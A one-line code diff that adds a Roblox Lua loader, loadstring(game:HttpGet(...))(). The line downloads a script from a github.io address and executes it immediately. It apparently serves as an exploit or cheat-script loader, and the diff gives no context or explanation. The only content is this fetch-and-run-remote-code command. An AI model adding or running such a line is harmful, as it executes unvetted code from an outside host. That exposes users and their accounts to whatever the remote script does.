@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://Custom-Controls1.github.io/-"))()
